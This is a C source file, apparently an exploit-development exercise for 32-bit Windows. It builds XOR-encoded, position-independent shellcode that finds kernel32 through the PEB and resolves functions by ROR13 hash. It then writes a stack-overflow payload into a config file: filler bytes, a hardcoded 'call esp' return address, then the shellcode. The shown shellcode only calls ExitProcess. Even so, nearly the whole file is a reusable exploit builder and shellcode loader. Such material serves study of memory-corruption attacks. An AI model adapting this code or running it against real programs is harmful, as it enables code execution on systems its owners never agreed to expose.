#define _CRT_SECURE_NO_WARNINGS

#include <stdio.h>
#include <Windows.h>
#include <winternl.h>
#include <wchar.h>

#pragma region ShellCode

#define XOR_BYTE 0x5
#define XOR_VAL 0x01010101


PPEB get_peb(void);
DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string);
DWORD __stdcall ror13_hash(const char *string);
HMODULE __stdcall find_module_by_hash(DWORD hash);
HMODULE __stdcall find_kernel32(void);
FARPROC __stdcall find_function(HMODULE module, DWORD hash);
void __stdcall shell_entry();
void END_SHELLCODE(void);

// if we want to test our shell we won't need to encrypt it
//#define debug_code

#pragma optimize("", off)  

void __stdcall shell_code()
{
	char* begin, *end;

#ifndef debug_code

	// get shell_entry address
	__asm
	{
		mov eax, shell_entry
		xor eax, XOR_VAL
		mov begin, eax
	}

	// get END_SHELLCODE address
	__asm
	{
		mov eax, END_SHELLCODE
		xor eax, XOR_VAL
		mov end, eax
	}

	int active_code_size = (int)end - (int)begin;

	//decrypt shell code
	for (char* p = begin; p - begin < active_code_size; p++)
		*p ^= XOR_BYTE;

#else

	shell_begin = (int)shell_entry;

#endif // debug_code

	// shell_entry
	((void(*)())begin)();
}

void __stdcall shell_entry()
{
	// work
	HMODULE kern32 = find_kernel32();
	char name[] = { 'E','x','i','t','P','r','o','c','e','s','s', 0 };
	FARPROC exit = find_function(kern32, ror13_hash((char*)name));
	
	exit(0);
}

HMODULE __stdcall find_kernel32(void)
{
	return find_module_by_hash(ror13_hash("KERNEL32.DLL"));
}

HMODULE __stdcall find_module_by_hash(DWORD hash)
{
	PPEB peb = NULL;
	LDR_DATA_TABLE_ENTRY *module_ptr = NULL, *first_mod = NULL;
	PLIST_ENTRY pListEntry = NULL;

	peb = get_peb();

	pListEntry = peb->Ldr->InMemoryOrderModuleList.Flink;
	module_ptr = (PLDR_DATA_TABLE_ENTRY)pListEntry;
	first_mod = module_ptr;

	do 
	{
		if (module_ptr->FullDllName.Length != 0 &&
			unicode_ror13_hash((WCHAR *)module_ptr->FullDllName.Buffer) == hash)
		{
			return (HMODULE)module_ptr->Reserved2[0];
		}

		else
		{
			pListEntry = pListEntry->Flink;
			module_ptr = (PLDR_DATA_TABLE_ENTRY)pListEntry;
		}

	} while (module_ptr && module_ptr != first_mod);   // because the list wraps,

	return INVALID_HANDLE_VALUE;
}

PPEB __declspec(naked) get_peb(void)
{
	__asm {
		mov eax, fs:[0x30]
		ret
	}
}

DWORD __stdcall unicode_ror13_hash(const WCHAR *unicode_string)
{
	DWORD hash = 0;

	while (*unicode_string != 0)
	{
		DWORD val = (DWORD)*unicode_string++;
		hash = (hash >> 13) | (hash << 19); // ROR 13
		hash += val;
	}
	return hash;
}

DWORD __stdcall ror13_hash(const char *string)
{
	DWORD hash = 0;

	while (*string) {
		DWORD val = (DWORD)*string++;
		hash = (hash >> 13) | (hash << 19);  // ROR 13
		hash += val;
	}
	return hash;
}

FARPROC __stdcall find_function(HMODULE module, DWORD hash)
{
	IMAGE_DOS_HEADER *dos_header;
	IMAGE_NT_HEADERS *nt_headers;
	IMAGE_EXPORT_DIRECTORY *export_dir;
	DWORD *names, *funcs;
	WORD *nameords;
	unsigned i;

	dos_header = (IMAGE_DOS_HEADER *)module;
	nt_headers = (IMAGE_NT_HEADERS *)((char *)module + dos_header->e_lfanew);
	export_dir = (IMAGE_EXPORT_DIRECTORY *)((char *)module + nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
	names = (DWORD *)((char *)module + export_dir->AddressOfNames);
	funcs = (DWORD *)((char *)module + export_dir->AddressOfFunctions);
	nameords = (WORD *)((char *)module + export_dir->AddressOfNameOrdinals);

	for (i = 0; i < export_dir->NumberOfNames; i++)
	{
		char *string = (char *)module + names[i];
		if (hash == ror13_hash(string))
		{
			WORD nameord = nameords[i];
			DWORD funcrva = funcs[nameord];
			return (FARPROC)((char *)module + funcrva);
		}
	}

	return NULL;
}

void __declspec(naked) END_SHELLCODE(void) {}

#pragma optimize("", on)  
#pragma endregion ShellCode


//////////////

#define SHELLCODE_FILE		"shellcode.bin"
#define CONFIG_FILE			"config_23"
#define CONFIG_FILE_COPY	"config_23_copy"

// gets file size in bytes
unsigned getFileSize(char* path)
{
	FILE* f = fopen(path, "rb");
	fseek(f, 0, SEEK_END);
	long n = ftell(f);
	fclose(f);

	if (n > 0)
		return (unsigned)n;

	return 0;
}

// write shellcode as payload into conf file
BOOL sc_write_conf(char *path, char* path_to)
{
	HANDLE hfile;
	unsigned int size, readed, written;

	// get call esp addr reversed
	char callEspAddrRev[] = "\x62\x50\x12\x97";
	_strrev(callEspAddrRev);

	// load shellcode from bin file to buffer
	hfile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		printf("Error, can't open shellcode!\n");
		return FALSE;
	}

	size = GetFileSize(hfile, NULL);
	if (!size) {
		printf("Error, file is empty\n");
		return FALSE;
	}

	char *pbuf = (char *)malloc(size);
	if (!ReadFile(hfile, pbuf, size, (LPDWORD)&readed, NULL)) {
		printf("Error, can't read shellcode data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	CloseHandle(hfile);
	hfile = NULL;

	// write shellcode to file as a payload
	hfile = CreateFileA(path_to, FILE_APPEND_DATA, 0, NULL, OPEN_EXISTING, 0, NULL);
	if (hfile == INVALID_HANDLE_VALUE) {
		printf("Error, can't open config file!\n");
		return FALSE;
	}

	// write 3000 + 4 + 4 + 4 'H' bytes (append after /start)
	char tmp[3000 + sizeof(int) + sizeof(int) + sizeof(int)];
	memset(tmp, 'H', sizeof(tmp));
	if (!WriteFile(hfile, tmp, sizeof(tmp), (LPDWORD)&written, NULL)) {
		printf("Error, can't write trash data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	// overwrite return address by call esp address
	if (!WriteFile(hfile, callEspAddrRev, sizeof(unsigned), (LPDWORD)&written, NULL)) {
		printf("Error, can't write callespaddr data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	// overwrite return address by call esp address
	if (!WriteFile(hfile, pbuf, size, (LPDWORD)&written, NULL)) {
		printf("Error, can't write shellcode data\n");
		free(pbuf); CloseHandle(hfile); return FALSE;
	}

	free(pbuf);
	CloseHandle(hfile);
	return TRUE;
}

// write shell code to bin file 
BOOL sc_write_bin(char *path)
{
	int full_code_size = (int)END_SHELLCODE - (int)shell_code;
	int active_code_size = (int)END_SHELLCODE - (int)shell_entry;
	int xor_code_size = full_code_size - active_code_size;

	char* buf = (char*)malloc(full_code_size * sizeof(char));
	memcpy(buf, shell_code, full_code_size);

#ifndef debug_code

	BOOL b1 = FALSE, b2 = FALSE;

	// xor shell_entry address
	for (char* p = buf; p - buf < xor_code_size; p++)
	{
		// addresses contain null bytes therefore need to use xor
		if (!b1 && *(int*)p == (int)shell_entry)
		{
			*(int*)p ^= XOR_VAL;
			b1 = TRUE;
			printf("XORed shell_entry address\n");
		}

		if (!b2 && *(int*)p == (int)END_SHELLCODE)
		{
			*(int*)p ^= XOR_VAL;
			b2 = TRUE;
			printf("XORed END_SHELLCODE address\n");
		}

		if (b1 && b2)
			break;
	}

	printf("XORing shellcode\n");

	// encrypt code n
	char* begin = (char*)(buf + xor_code_size);
	for (char* p = begin; p - begin < active_code_size; p++)
		*p ^= XOR_BYTE;

#endif // DEBUG


	// write shellcode
	FILE *output_file = fopen(path, "wb");

	if (!output_file)
	{
		free(buf);
		return FALSE;
	}

	fwrite(buf, full_code_size, sizeof(char), output_file);
	fclose(output_file);
	free(buf);
	return TRUE;
}

// load shell code to virtual memory and exec
void sc_exec(char* path)
{
	unsigned fsize = getFileSize(path);
	char* code = malloc(fsize);
	
	FILE* f = fopen(path, "rb");
	fread(code, sizeof(char), fsize, f);
	fclose(f);

	LPVOID pspace = NULL;

	pspace = VirtualAlloc(NULL, fsize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!pspace) {
		printf("Error, can't allocate virtual page\n");
		free(code); 
		return;
	}

	memcpy(pspace, code, fsize);
	((void(*)())pspace)();//call shellcode

	VirtualFree(pspace, 0, MEM_RELEASE);
	free(code); 
}

// find byte that won't be found in the byte code
unsigned char find_xor_byte()
{
	for (int byte = 1; byte < 0xFF; byte++)
	{
		BOOL found = FALSE;

		for (char* c = (char*)shell_entry; (int)c < (int)END_SHELLCODE; c++)
		{
			if (*c == byte)
			{
				found = TRUE;
				break;
			}
		}

		// is not found -> can use xor
		if (!found)
			return (unsigned char)byte;
	}

	return 0;
}


int main(int argc, char *argv[])
{
	//shell_code();

	unsigned char xor_byte = find_xor_byte();

	if (xor_byte == 0)
	{
		printf("Xor byte is null\n");
		return 1;
	}

	if (xor_byte != XOR_BYTE)
	{
		printf("Need to update XOR_BYTE constant to 0x%x\n", xor_byte);
		return 1;
	}

	// clear config file
	CopyFile(CONFIG_FILE_COPY, CONFIG_FILE, FALSE);

	// write shell code to bin file
	if (!sc_write_bin(SHELLCODE_FILE))
	{
		printf("Unable to load shell. Exitting\n");
		return 1;
	}

	// write shell code from bin to conf file
	if (!sc_write_conf(SHELLCODE_FILE, CONFIG_FILE)) {

		printf("Unable to load shell. Exitting\n");
		return 1;
	}

	printf("Enter any key to execute shell code\n");
	getchar();

	// load shell code to virtual memory and exec
	sc_exec(SHELLCODE_FILE);

	printf("Enter any key to exit\n");

	if (getchar() && FALSE)
	{
		// for compilation and debugging
		shell_code();
	}

	return 0;
}
